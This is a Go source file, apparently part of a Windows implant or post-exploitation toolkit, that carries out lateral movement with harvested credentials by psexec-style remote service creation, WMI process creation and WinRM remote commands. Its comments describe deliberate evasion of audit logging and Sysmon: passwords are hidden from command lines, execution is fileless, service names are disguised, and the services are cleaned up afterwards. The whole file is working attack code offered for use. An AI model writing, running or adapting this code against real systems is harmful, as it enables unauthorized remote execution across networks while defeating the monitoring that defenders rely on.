//go:build windows

package commands

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// ===== A4: 横向移动（凭据利用）=====
// psexec: 建立 SMB IPC$ 连接 -> 复制载荷到 admin$ -> 创建并启动服务 -> 清理
// wmi_exec: WMI Win32_Process.Create 远程执行
// 命令格式（| 分隔，密码可含空格）：
//   psexec <target>|<user>|<pass>|<command>
//   wmi_exec <target>|<user>|<pass>|<command>

// execWithTimeoutLong 远程操作使用更长超时（60s）
func execWithTimeoutLong(name string, args ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	return exec.CommandContext(ctx, name, args...).CombinedOutput()
}

// lateralPassEnvName 横向移动凭据传递用的环境变量名。
// 【OPSEC】密码绝不进命令行/脚本参数(原 'net use \\t\ipc$ 密码' 与 PowerShell
// ConvertTo-SecureString '密码' 都会被 4688 进程创建审计/Sysmon WMI 事件捕获):
// 凭据经 os/exec Env 传给子进程,PowerShell 侧从 $env: 读取,命令行全程无密码。
// 子进程退出即随进程环境销毁。
const lateralPassEnvName = "__TSHELL_LP"

// execPSWithEnv 执行 PowerShell 脚本并注入额外环境变量(密码经此传递)
func execPSWithEnv(script string, env map[string]string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script)
	cmd.Env = append(os.Environ(), envKV(env)...)
	return cmd.CombinedOutput()
}

func envKV(env map[string]string) []string {
	out := make([]string, 0, len(env))
	for k, v := range env {
		out = append(out, k+"="+v)
	}
	return out
}

// CmdPsexec 通过 SMB 服务方式在远程主机执行命令（wmi/winrm 前缀分流）。
// 【OPSEC】无文件模式：服务 binPath 直接执行命令，不复制载荷到 admin$（避免落盘痕迹）。
func CmdPsexec(cmdBuf []byte) ([]byte, error) {
	prefix := string(cmdBuf)
	switch {
	case strings.HasPrefix(prefix, "wmi "):
		return CmdWmiExec(cmdBuf[4:])
	case strings.HasPrefix(prefix, "winrm "):
		return CmdWinrmExec(cmdBuf[7:])
	}
	parts := strings.SplitN(string(cmdBuf), "|", 4)
	if len(parts) != 4 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[3]) == "" {
		return nil, fmt.Errorf("用法: psexec <target>|<user>|<pass>|<command>")
	}
	target := strings.TrimSpace(parts[0])
	user := strings.TrimSpace(parts[1])
	pass := parts[2]
	command := parts[3]

	target = strings.TrimPrefix(target, `\\`)
	if !strings.HasPrefix(target, `\\`) {
		target = `\\` + target
	}

	var logs []string

	// 1. 建立 SMB IPC$ 连接（凭据可选；空凭据使用当前令牌上下文）
	// 【OPSEC】密码经环境变量注入,由 PowerShell 侧建立 IPC$ 连接,命令行无密码
	if user != "" {
		psSMB := fmt.Sprintf(`net use %s\ipc$ $env:%s /user:%s /y`, target, lateralPassEnvName, user)
		out, err := execPSWithEnv(psSMB, map[string]string{lateralPassEnvName: pass})
		logs = append(logs, "[SMB] "+strings.TrimSpace(string(out)))
		if err != nil {
			logs = append(logs, fmt.Sprintf("[!] SMB 连接失败: %v", err))
			return []byte(strings.Join(logs, "\n")), nil
		}
		defer func() {
			execWithTimeoutLong("cmd", "/c", "net use "+target+`\ipc$ /delete /y`)
		}()
	}

	// 2. 创建并启动服务直接执行命令（无文件：不复制载荷，SC 服务 binPath 指向 cmd /c）
	svcName := fmt.Sprintf("%s_%d", masquerade("Svc"), time.Now().UnixNano()%100000)
	binPath := fmt.Sprintf(`cmd /c %s`, strings.ReplaceAll(command, `"`, `\"`))
	createCmd := fmt.Sprintf(`sc %s create %s binPath= "%s" start= demand`, target, svcName, binPath)
	out, err := execWithTimeoutLong("cmd", "/c", createCmd)
	logs = append(logs, "[SC-CREATE] "+strings.TrimSpace(string(out)))
	if err != nil {
		logs = append(logs, fmt.Sprintf("[!] 服务创建失败（需管理员凭据）: %v", err))
		return []byte(strings.Join(logs, "\n")), nil
	}
	startCmd := fmt.Sprintf(`sc %s start %s`, target, svcName)
	out, _ = execWithTimeoutLong("cmd", "/c", startCmd)
	logs = append(logs, "[SC-START] "+strings.TrimSpace(string(out)))
	delCmd := fmt.Sprintf(`sc %s delete %s`, target, svcName)
	execWithTimeoutLong("cmd", "/c", delCmd)
	logs = append(logs, "[SC-CLEAN] 服务已删除")

	return []byte(strings.Join(logs, "\n")), nil
}

// CmdWmiExec 通过 WMI Win32_Process.Create 远程执行命令
func CmdWmiExec(cmdBuf []byte) ([]byte, error) {
	parts := strings.SplitN(string(cmdBuf), "|", 4)
	if len(parts) != 4 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[3]) == "" {
		return nil, fmt.Errorf("用法: wmi_exec <target>|<user>|<pass>|<command>")
	}
	target := strings.TrimSpace(parts[0])
	user := strings.TrimSpace(parts[1])
	pass := parts[2]
	command := strings.ReplaceAll(parts[3], "'", "''")

	var ps string
	env := map[string]string{}
	if user != "" {
		// 【OPSEC】密码经环境变量注入($env:),脚本/命令行均无明文
		env[lateralPassEnvName] = pass
		ps = fmt.Sprintf(`
$sec = ConvertTo-SecureString $env:%s -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $sec)
Invoke-WmiMethod -ComputerName '%s' -Credential $cred -Class Win32_Process -Name Create -ArgumentList '%s' | Select-Object ProcessId, ReturnValue | Format-List
`, lateralPassEnvName, user, target, command)
	} else {
		ps = fmt.Sprintf(`
Invoke-WmiMethod -ComputerName '%s' -Class Win32_Process -Name Create -ArgumentList '%s' | Select-Object ProcessId, ReturnValue | Format-List
`, target, command)
	}

	out, err := execPSWithEnv(ps, env)
	if err != nil {
		return nil, fmt.Errorf("WMI 执行失败: %v", err)
	}
	result := strings.TrimSpace(string(out))
	if strings.Contains(result, "ReturnValue") {
		return []byte("[+] WMI 远程执行完成:\n" + result), nil
	}
	return []byte(result), nil
}

// CmdWinrmExec 通过 WinRM(Invoke-Command) 远程执行: winrm <target>|<user>|<pass>|<command>
func CmdWinrmExec(cmdBuf []byte) ([]byte, error) {
	parts := strings.SplitN(string(cmdBuf), "|", 4)
	if len(parts) != 4 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[3]) == "" {
		return nil, fmt.Errorf("用法: winrm_exec <target>|<user>|<pass>|<command>")
	}
	target := strings.TrimSpace(parts[0])
	user := strings.TrimSpace(parts[1])
	pass := parts[2]
	command := strings.ReplaceAll(parts[3], "'", "''")

	var ps string
	env := map[string]string{}
	if user != "" {
		// 【OPSEC】密码经环境变量注入($env:),脚本/命令行均无明文
		env[lateralPassEnvName] = pass
		ps = fmt.Sprintf(`
$sec = ConvertTo-SecureString $env:%s -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $sec)
$r = Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock { %s } -ErrorAction Stop
$r | Out-String
`, lateralPassEnvName, user, target, command)
	} else {
		ps = fmt.Sprintf(`
$r = Invoke-Command -ComputerName '%s' -ScriptBlock { %s } -ErrorAction Stop
$r | Out-String
`, target, command)
	}

	out, err := execPSWithEnv(ps, env)
	if err != nil {
		return nil, fmt.Errorf("WinRM 执行失败: %v（目标需启用 WinRM/PowerShell Remoting）", err)
	}
	return []byte("[+] WinRM 远程执行完成:\n" + strings.TrimSpace(string(out))), nil
}

